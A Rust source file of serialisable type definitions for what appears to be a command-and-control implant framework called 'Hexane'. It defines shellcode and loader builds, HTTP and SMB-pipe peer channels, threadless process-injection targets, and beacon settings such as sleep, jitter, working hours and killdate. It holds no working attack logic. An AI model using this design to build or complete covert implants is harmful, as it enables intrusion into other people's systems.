use std::collections::HashMap;

use serde::Serialize as Ser;
use serde::Deserialize as Des;
use serde::ser::{Serialize, Serializer, SerializeStruct};

#[derive(Ser, Des, Debug)]
pub enum BuildType {
    Loader,
    Shellcode,
}

#[derive(Ser, Des, Debug)]
pub enum MessageType {
    TypeConfig,
    TypeCheckin,
    TypeTasking,
    TypeResponse,
    TypeSegment,
	TypeCommand,
}

#[derive(Ser, Des, Debug)]
pub enum CommandType {
    CommandDir,
    CommandMods,
    CommandShutdown,
    CommandUpdatePeer,
    CommandRemovePeer,
    CommandNoJob,
}

#[derive(Ser, Des, Debug, Clone)]
#[serde(rename_all = "lowercase")]
pub enum NetworkType {
    Http,
    Smb,
}

#[derive(Ser, Des, Debug, Clone)]
#[serde(untagged)]
pub enum NetworkOptions {
    Http(Http),
    Smb(Smb),
}

#[derive(Ser, Des, Debug, Clone)]
pub struct Network {
    pub r#type:     NetworkType,
    pub options:    NetworkOptions,
}

#[derive(Ser, Des, Debug, Clone)]
pub struct Smb {
    pub egress_peer: String,
    pub egress_pipe: Option<String>,
}

#[derive(Ser, Des, Debug, Default, Clone)]
pub struct Http {
    pub address:    String,
    pub port:       u16,
    pub endpoints:  Vec<String>,
    pub domain:     Option<String>,
    pub useragent:  Option<String>,
    pub headers:    Option<Vec<String>>,
    pub proxy:      Option<Proxy>,
}

#[derive(Ser, Des, Debug)]
#[serde(rename_all = "lowercase")]
pub enum InjectionType {
    Threadless,
    Threadpool,
}

#[derive(Ser, Des, Debug)]
#[serde(untagged)]
pub enum InjectionOptions {
    Threadless(Threadless),
    Threadpool(Threadpool),
}

#[derive(Ser, Des, Debug)]
pub struct Injection {
    pub r#type: InjectionType,
    pub options: InjectionOptions,
}

#[derive(Ser, Des, Debug)]
pub struct Threadless {
    pub target_process:     String,
    pub target_module:      String,
    pub target_function:    String,
    pub loader_assembly:    String,
    pub execute_object:     String,
}

#[derive(Ser, Des, Debug)]
pub struct Threadpool{
}

#[derive(Debug)]
pub struct Message {
    pub msg_type:    String,
    pub msg:         String,
}

#[derive(Ser, Des, Debug, Default, Clone)]
pub struct Config {
    pub debug:           bool,
    pub encrypt:         bool,
    pub architecture:    String,
    pub hostname:        String,
    pub working_hours:   Option<String>,
    pub killdate:        Option<String>,
    pub config_size:     u32, 
    pub sleeptime:       u32,
    pub retries:         u32,
    pub jitter:          u16,
}

#[derive(Ser, Des, Debug, Default)]
pub struct Builder {
    pub output_name:            String,
    pub root_directory:         String,
    pub linker_script:          Option<String>,
    pub loaded_modules:         Option<Vec<String>>,
    pub dependencies:           Option<Vec<String>>,
    pub include_directories:    Option<Vec<String>>,
}

#[derive(Ser, Des, Debug)]
pub struct Loader {
    pub root_directory: String,
    pub rsrc_script:    String,
    pub injection:      Injection,
    pub sources:        Vec<String>,
    pub linker_script:  Option<String>,
    pub dependencies:   Option<Vec<String>>,
}

#[derive(Ser, Des, Debug, Clone)]
pub struct Proxy {
    pub address:    String,
    pub proto:      String,
    pub port:       u16,
    pub username:   Option<String>,
    pub password:   Option<String>,
}

#[derive(Ser, Des, Debug)]
pub struct JsonData {
    pub config:  Config,
    pub builder: Builder,
    pub network: Option<Network>, // is option but checked in the config
    pub loader:  Option<Loader>,
}


#[derive(Ser, Des, Debug, Default)]
pub struct Compiler {
    pub file_extension:  String,
    pub build_directory: String,
    pub flags:           String,
    pub components:      Vec<String>,
    pub definitions:     HashMap<String, Vec<u8>>,
    pub command:         String,
}

#[derive(Ser, Des, Debug, Default, Clone)]
pub struct UserSession {
    pub username: String,
    pub is_admin: bool,
}

#[derive(Debug)]
pub struct Parser {
    pub msg_buffer: Vec<u8>,
    pub pointer:    usize,
    pub big_endian: bool,
    pub msg_length: u32,
    pub peer_id:    u32,
    pub task_id:    u32,
    pub msg_type:   u32,
}


#[derive(Ser, Des, Debug, Default)]
pub struct Hexane {
    pub taskid:          u32,
    pub peer_id:         u32,
    pub group_id:        u32,
    pub build_type:      u32,
    pub session_key:     Vec<u8>,
    pub shellcode:       Vec<u8>,
    pub config:          Vec<u8>,
    pub active:          bool,
    pub main_cfg:        Config,
    pub builder_cfg:     Builder,
    pub compiler_cfg:    Compiler,
    pub network_cfg:     Option<Network>, // says "optional" but is checked for in the config
    pub loader_cfg:      Option<Loader>,
    pub user_session:    UserSession,
}

#[derive(Ser, Des)]
pub struct HexaneStream {
    pub peer_id:       u32,
    pub group_id:      u32,
    pub username:      String,
	pub address:       String,
    pub session_key:   Vec<u8>,
    pub endpoints:     Vec<String>,
    pub network_type:  NetworkType,
}

#[derive(Ser, Des)]
pub struct ServerPacket {
    pub username:  String,
	pub buffer:    String,
}

